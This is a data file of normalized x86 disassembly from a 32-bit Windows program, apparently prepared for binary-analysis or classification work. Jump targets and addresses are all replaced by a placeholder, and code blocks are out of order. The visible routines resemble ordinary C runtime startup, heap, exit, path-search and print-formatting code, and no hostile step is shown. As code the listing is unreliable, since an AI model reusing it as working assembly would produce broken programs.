sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rwxdata ] edx
mov ecx eax
and ecx 0xff
mov [ rwxdata ] ecx
shl ecx 0x8
add ecx edx
mov [ rwxdata ] ecx
shr eax 0x10
mov [ rwxdata ] eax
xor esi esi
push esi
call sub_424a7a
pop ecx
test eax eax
jne rwxdata
mov [ ebp - 0x4 ] esi
call sub_42475a
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_424628
mov [ rwxdata ] eax
call sub_4243db
call sub_424322
call sub_422eea
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_4242ca
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je rwxdata
push 0x1c
call sub_422c26
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp rwxdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_422062
mov [ ebp - 0x60 ] eax
push eax
call sub_422f17
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_424146
pop ecx
pop ecx
retn
sub_422c4a
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
jne rwxdata
mov esi [ ebp + 0xc ]
test esi esi
jne rwxdata
push [ ebp + 0xc ]
call sub_42304d
pop ecx
jmp rwxdata
mov eax [ rwxdata ]
cmp eax 0x3
jne rwxdata
push [ ebp + 0x8 ]
call sub_423e39
pop ecx
jmp rwxdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja rwxdata
cmp esi 0xffffffe0
ja rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
push [ ebp + 0x8 ]
call sub_424e7c
mov ebx eax
pop ecx
test ebx ebx
je rwxdata
cmp [ rwxdata ] 0x0
je rwxdata
test esi esi
jne rwxdata
xor edi edi
cmp esi 0xffffffe0
ja rwxdata
test esi esi
jbe rwxdata
mov eax edi
jmp rwxdata
push esi
call sub_426048
test eax eax
pop ecx
jne rwxdata
test esi esi
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
push esi
call sub_426048
test eax eax
pop ecx
jne rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
test eax eax
jne rwxdata
push 0x1
pop esi
cmp [ rwxdata ] 0x0
je rwxdata
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_425bd7
mov ebx eax
add esp 0xc
test ebx ebx
je rwxdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp rwxdata
jmp rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne rwxdata
mov edi [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_425685
add esp 0xc
test eax eax
jne rwxdata
push esi
call sub_426048
test eax eax
pop ecx
jne rwxdata
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
cmp esi [ rwxdata ]
jae rwxdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je rwxdata
push 0x1
pop esi
test edi edi
jne rwxdata
push esi
call sub_4251d0
mov edi eax
pop ecx
test edi edi
je rwxdata
jmp rwxdata
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je rwxdata
mov edi esi
shr edi 0x4
push edi
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_425f9f
add esp 0x10
test eax eax
je rwxdata
test ebx ebx
jne rwxdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx - 0x4 ]
dec eax
cmp eax esi
jb rwxdata
mov ebx [ ebp + 0x8 ]
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb rwxdata
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb rwxdata
push edi
call sub_425c73
mov edi eax
pop ecx
test edi edi
je rwxdata
mov edi [ ebp + 0x8 ]
jmp rwxdata
test edi edi
jne rwxdata
push eax
push ecx
push edi
call sub_422780
push [ ebp + 0x8 ]
push ebx
call sub_424ea7
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_422780
push ebx
call sub_424e7c
push [ ebp + 0x8 ]
mov ebx eax
push ebx
call sub_424ea7
add esp 0x18
mov eax esi
push eax
push [ ebp + 0x8 ]
push edi
call sub_422780
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_425c2e
add esp 0x18
jmp rwxdata
mov eax esi
movzx eax [ ebx ]
shl eax 0x4
cmp eax esi
jb rwxdata
test edi edi
jne rwxdata
test edi edi
jne rwxdata
push eax
push [ ebp + 0x8 ]
push edi
call sub_422780
push ebx
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_425c2e
add esp 0x18
mov eax esi
sub_422f39
push edi
push 0x1
pop edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rwxdata ] edi
mov [ rwxdata ] bl
jne rwxdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rwxdata
push rwxdata
call sub_422fd2
pop ecx
pop ecx
test ebx ebx
pop ebx
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rwxdata ] edi
call [ ExitProcess@IAT ]
push rwxdata
push rwxdata
call sub_422fd2
pop ecx
pop ecx
mov ecx [ rwxdata ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb rwxdata
pop esi
mov eax [ esi ]
test eax eax
je rwxdata
sub esi 0x4
cmp esi [ rwxdata ]
jae rwxdata
call eax
sub_422fec
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
push esi
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
mov esi [ ebp + 0x8 ]
push esi
call sub_424e7c
test eax eax
pop ecx
je rwxdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_425bd7
add esp 0xc
test eax eax
je rwxdata
push esi
jmp rwxdata
mov eax [ esi - 0x4 ]
sub eax 0x9
jmp rwxdata
movzx eax [ eax ]
shl eax 0x4
jmp rwxdata
push 0x0
push [ rwxdata ]
call [ HeapSize@IAT ]
pop esi
leave
retn
sub_42305f
cmp [ esp + 0x4 ] 0xffffffe0
ja rwxdata
xor eax eax
push [ esp + 0x4 ]
call sub_42308b
test eax eax
pop ecx
jne rwxdata
retn
cmp [ esp + 0x8 ] eax
je rwxdata
push [ esp + 0x4 ]
call sub_426048
test eax eax
pop ecx
jne rwxdata
sub_42308b
mov eax [ rwxdata ]
push esi
mov esi [ esp + 0x8 ]
cmp eax 0x3
jne rwxdata
cmp eax 0x2
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
test esi esi
jne rwxdata
mov eax [ esp + 0x8 ]
test eax eax
je rwxdata
push esi
call sub_4251d0
test eax eax
pop ecx
je rwxdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
push 0x10
pop esi
lea esi [ eax + 0xf ]
and esi 0xfffffff0
jmp rwxdata
pop esi
retn
push esi
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov eax esi
shr eax 0x4
push eax
call sub_425c73
test eax eax
pop ecx
jne rwxdata
cmp esi [ rwxdata ]
ja rwxdata
pop esi
retn
jmp rwxdata
sub_4230ff
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_423262
add esp 0x10
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne rwxdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
leave
retn
cmp [ rwxdata ] 0x2
jne rwxdata
push 0x2f
push [ ebp + 0xc ]
call sub_426137
pop ecx
test eax eax
pop ecx
jne rwxdata
push rwxdata
call sub_423440
mov edi eax
pop ecx
test edi edi
je rwxdata
push 0x104
call sub_42304d
mov esi eax
pop ecx
test esi esi
je rwxdata
push ebx
mov ebx 0x103
push ebx
push esi
push edi
push esi
call sub_423e39
pop ecx
pop ebx
cmp [ esi ] 0x0
je rwxdata
push esi
call sub_4224c0
lea edi [ eax + esi - 0x1 ]
pop ecx
mov al [ edi ]
cmp al 0x5c
jne rwxdata
cmp al 0x2f
push 0x5c
push esi
call sub_426063
pop ecx
cmp edi eax
pop ecx
jmp rwxdata
push esi
call sub_4224c0
push [ ebp + 0xc ]
mov edi eax
call sub_4224c0
add edi eax
pop ecx
cmp edi 0x104
pop ecx
jae rwxdata
push rwxdata
push esi
call sub_422550
pop ecx
pop ecx
je rwxdata
push [ ebp + 0xc ]
push esi
call sub_422550
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_423262
add esp 0x18
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne rwxdata
cmp [ rwxdata ] 0x2
je rwxdata
push ebx
push esi
push [ ebp - 0x4 ]
jmp rwxdata
push 0x5c
push esi
call sub_426137
pop ecx
cmp esi eax
pop ecx
je rwxdata
call sub_4260c3
add esp 0xc
mov [ ebp - 0x4 ] eax
test eax eax
je rwxdata
lea edi [ esi + 0x1 ]
push 0x5c
push edi
call sub_426137
pop ecx
cmp edi eax
pop ecx
je rwxdata
push 0x2f
push esi
call sub_426137
pop ecx
cmp esi eax
pop ecx
jne rwxdata
push 0x2f
push edi
call sub_426137
pop ecx
cmp edi eax
pop ecx
jne rwxdata
sub_423262
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push 0x5c
push ebx
mov edi ebx
call sub_426063
push 0x2f
push ebx
mov esi eax
call sub_426063
add esp 0x10
test eax eax
jne rwxdata
test esi esi
je rwxdata
test esi esi
jne rwxdata
mov esi eax
cmp eax esi
jbe rwxdata
or [ ebp - 0x8 ] 0xffffffff
push 0x2e
push esi
call sub_426063
pop ecx
test eax eax
pop ecx
je rwxdata
push 0x3a
push ebx
call sub_426137
mov esi eax
pop ecx
test esi esi
pop ecx
jne rwxdata
push edi
call sub_4224c0
add eax 0x5
push eax
call sub_42304d
mov ebx eax
pop ecx
test ebx ebx
pop ecx
mov [ ebp - 0x4 ] ebx
jne rwxdata
push 0x0
push edi
call sub_4233fc
pop ecx
cmp eax 0xffffffff
pop ecx
je rwxdata
push ebx
call sub_4224c0
add eax 0x3
push eax
call sub_42304d
mov edi eax
pop ecx
test edi edi
pop ecx
je rwxdata
push edi
push ebx
call sub_422540
push edi
call sub_4224c0
mov esi eax
add esp 0xc
add esi ebx
mov ebx rwxdata
or eax 0xffffffff
jmp rwxdata
cmp edi ebx
je rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_4233ab
add esp 0x10
mov [ ebp - 0x8 ] eax
jmp rwxdata
push rwxdata
push edi
call sub_422540
push ebx
push edi
call sub_422550
add esp 0x10
lea esi [ edi + 0x2 ]
jmp rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4233ab
add esp 0x10
mov [ ebp - 0x8 ] eax
sub ebx 0x4
cmp ebx rwxdata
jge rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
push edi
call sub_423e39
pop ecx
push [ ebx ]
push esi
call sub_422540
push 0x0
push [ ebp - 0x4 ]
call sub_4233fc
add esp 0x10
cmp eax 0xffffffff
jne rwxdata
jmp rwxdata
push [ ebp - 0x4 ]
call sub_423e39
mov ebx [ ebp + 0xc ]
pop ecx
sub_4233ab
push ebp
mov ebp esp
push [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_426389
add esp 0x14
cmp eax 0xffffffff
jne rwxdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4261aa
push [ ebp + 0x14 ]
mov esi eax
call sub_423e39
push [ ebp + 0x10 ]
call sub_423e39
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
or eax eax
pop ebp
retn
sub_4233fc
push [ esp + 0x4 ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne rwxdata
test al 0x1
je rwxdata
call [ GetLastError@IAT ]
push eax
call sub_42658d
pop ecx
xor eax eax
retn
test [ esp + 0x8 ] 0x2
je rwxdata
mov [ rwxdata ] 0xd
mov [ rwxdata ] 0x5
jmp rwxdata
or eax 0xffffffff
retn
sub_423440
cmp [ rwxdata ] 0x0
push ebx
push esi
mov esi [ rwxdata ]
push edi
je rwxdata
xor eax eax
test esi esi
jne rwxdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je rwxdata
cmp [ rwxdata ] esi
je rwxdata
push ebx
call sub_4224c0
pop ecx
mov edi eax
call sub_426633
test eax eax
jne rwxdata
push eax
call sub_4224c0
cmp eax edi
pop ecx
jbe rwxdata
mov esi [ rwxdata ]
test esi esi
je rwxdata
add esi 0x4
jmp rwxdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne rwxdata
mov eax [ esi ]
test eax eax
je rwxdata
push edi
push ebx
push eax
call sub_4265f4
add esp 0xc
test eax eax
je rwxdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp rwxdata
pop edi
pop esi
pop ebx
retn
sub_4234bd
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je rwxdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne rwxdata
test al 0x1
je rwxdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne rwxdata
and [ esi + 0x4 ] 0x0
test al 0x10
je rwxdata
test [ esi + 0xc ] 0x108
push edi
je rwxdata
cmp esi rwxdata
je rwxdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_42673b
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle rwxdata
push ebx
call sub_42692c
test eax eax
pop ecx
jne rwxdata
cmp esi rwxdata
jne rwxdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp rwxdata
or [ esi + 0xc ] 0x20
jmp rwxdata
cmp ebx 0xffffffff
je rwxdata
push edi
push eax
push ebx
call sub_42673b
add esp 0xc
mov [ ebp + 0xc ] eax
jmp rwxdata
push esi
call sub_4268e8
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rwxdata
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx * 8 ]
jmp rwxdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp rwxdata
push 0x2
push 0x0
push ebx
call sub_4266a1
add esp 0xc
test [ eax + 0x4 ] 0x20
je rwxdata
cmp [ ebp + 0xc ] edi
pop edi
je rwxdata
sub_4235d2
push ebp
mov ebp esp
sub esp 0x24c
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ecx ecx
push edi
mov [ ebp - 0x10 ] ecx
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp + 0xc ] esi
je rwxdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov edi 0x800
mov edx 0x200
jmp rwxdata
cmp [ ebp - 0x14 ] 0x0
jl rwxdata
cmp bl 0x20
jl rwxdata
xor eax eax
cmp bl 0x78
jg rwxdata
mov esi [ ebp + 0xc ]
mov bl [ esi ]
inc esi
test bl bl
mov [ ebp + 0xc ] esi
jne rwxdata
jmp [ eax * 4 + jump_table_423d50 ]
movsx eax bl
mov al [ eax + rwxdata ]
and eax 0xf
jmp rwxdata
mov ecx [ ebp - 0x3c ]
mov edx 0x200
mov edi 0x800
xor eax eax
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2c ] eax
jmp rwxdata
movsx eax bl
sub eax 0x20
je rwxdata
cmp bl 0x2a
jne rwxdata
and [ ebp - 0x8 ] 0x0
jmp rwxdata
cmp bl 0x2a
jne rwxdata
cmp bl 0x49
je rwxdata
mov ecx [ rwxdata ]
and [ ebp - 0x2c ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je rwxdata
movsx eax bl
cmp eax 0x67
jg rwxdata
movsx eax [ ecx + eax * 8 + rwxdata ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x3c ] eax
ja rwxdata
or [ ebp - 0x4 ] 0x2
jmp rwxdata
sub eax 0x3
je rwxdata
mov eax [ ebp - 0x28 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e0e
test eax eax
pop ecx
mov [ ebp - 0x28 ] eax
jge rwxdata
mov eax [ ebp - 0x8 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x8 ] eax
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e0e
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jge rwxdata
cmp [ esi ] 0x36
jne rwxdata
cmp bl 0x68
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_423d70
add esp 0xc
jmp rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_423d70
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je rwxdata
cmp eax 0x65
jge rwxdata
or [ ebp - 0x4 ] 0x80
jmp rwxdata
sub eax 0x8
je rwxdata
mov [ ebp - 0x28 ] eax
jmp rwxdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp rwxdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne rwxdata
or [ ebp - 0x4 ] 0x20
jmp rwxdata
cmp bl 0x6c
je rwxdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je rwxdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge rwxdata
cmp eax 0x58
jg rwxdata
or [ ebp - 0x4 ] 0x1
jmp rwxdata
dec eax
dec eax
je rwxdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp rwxdata
or [ ebp - 0x4 ] 0x10
jmp rwxdata
cmp bl 0x77
jne rwxdata
test [ ebp - 0x4 ] 0x20
je rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e1b
pop ecx
jmp rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e0e
test [ ebp - 0x4 ] 0x20
pop ecx
je rwxdata
dec eax
je rwxdata
jne rwxdata
mov [ ebp - 0x8 ] 0x6
jmp rwxdata
sub eax 0x5a
je rwxdata
je rwxdata
or [ ebp - 0x4 ] 0x4
jmp rwxdata
sub eax 0x3
jne rwxdata
or [ ebp - 0x4 ] edi
jmp rwxdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
test [ ebp - 0x4 ] 0x40
je rwxdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp rwxdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je rwxdata
dec eax
je rwxdata
cmp [ ebp - 0x8 ] edx
jle rwxdata
cmp bl 0x67
jne rwxdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rwxdata ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e0e
test eax eax
pop ecx
je rwxdata
sub eax 0x9
je rwxdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je rwxdata
or [ ebp - 0x4 ] 0x8
jmp rwxdata
call sub_423e0e
pop ecx
xor edx edx
call sub_423e0e
pop ecx
jmp rwxdata
call sub_423e0e
pop ecx
movzx eax ax
jmp rwxdata
call sub_423e0e
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg rwxdata
cmp [ ebp - 0x30 ] 0x0
je rwxdata
mov [ ebp - 0x38 ] 0x1
jmp rwxdata
test [ ebp - 0x3 ] 0x80
je rwxdata
or [ ebp - 0x4 ] edx
jmp rwxdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je rwxdata
cmp [ ebp - 0x8 ] 0xa3
jle rwxdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp rwxdata
cmp bl 0x67
jne rwxdata
cmp [ ebp - 0x8 ] 0x0
jne rwxdata
mov eax [ rwxdata ]
mov [ ebp - 0xc ] eax
push eax
jmp rwxdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je rwxdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je rwxdata
dec eax
je rwxdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp rwxdata
test [ ebp - 0x4 ] 0x830
jne rwxdata
dec eax
dec eax
je rwxdata
cdq
jmp rwxdata
cmp [ ebp - 0x8 ] 0x0
jge rwxdata
and [ ebp - 0x1c ] 0x0
jl rwxdata
push [ ebp - 0x30 ]
call sub_423e39
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je rwxdata
dec eax
dec eax
je rwxdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_42304d
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je rwxdata
cmp [ edi ] 0x2d
jne rwxdata
test esi esi
jne rwxdata
push edi
call [ rwxdata ]
pop ecx
call sub_4224c0
pop ecx
jmp rwxdata
test [ ebp - 0x4 ] edi
je rwxdata
call sub_423e0e
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_423e2b
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_426952
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge rwxdata
jmp rwxdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je rwxdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle rwxdata
mov [ ebp - 0x8 ] 0x1
jmp rwxdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp rwxdata
test eax eax
jae rwxdata
lea eax [ ebp + 0x10 ]
push eax
call sub_423e0e
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je rwxdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne rwxdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp rwxdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rwxdata ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp rwxdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp rwxdata
cmp [ ebp - 0x38 ] 0x0
jne rwxdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp rwxdata
mov [ ebp - 0x38 ] 0x1
jmp rwxdata
sub eax 0xc
jne rwxdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne rwxdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne rwxdata
test ecx ecx
jne rwxdata
test ecx ecx
jne rwxdata
mov [ ebp - 0x34 ] 0x27
jmp rwxdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je rwxdata
test [ ebp - 0x4 ] 0x830
jne rwxdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rwxdata ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rwxdata ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je rwxdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne rwxdata
test bh 0x1
je rwxdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_426a30
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_4269c0
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle rwxdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je rwxdata
sub eax ecx
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
sub eax ecx
sar eax 0x1
jmp rwxdata
cmp [ eax ] 0x0
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_423dd6
add esp 0x10
test bl 0x8
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_423da5
add esp 0x10
test bl 0x1
je rwxdata
mov [ ebp - 0x16 ] 0x2d
jmp rwxdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp rwxdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je rwxdata
inc eax
jmp rwxdata
inc eax
inc eax
jmp rwxdata
cmp [ ebp - 0x2c ] 0x0
je rwxdata
test bl 0x4
jne rwxdata
test bl 0x2
je rwxdata
mov [ ebp - 0x16 ] 0x2b
jmp rwxdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg rwxdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne rwxdata
mov edx esi
dec esi
test edx edx
je rwxdata
mov edx esi
dec esi
test edx edx
je rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_423dd6
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle rwxdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_423da5
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne rwxdata
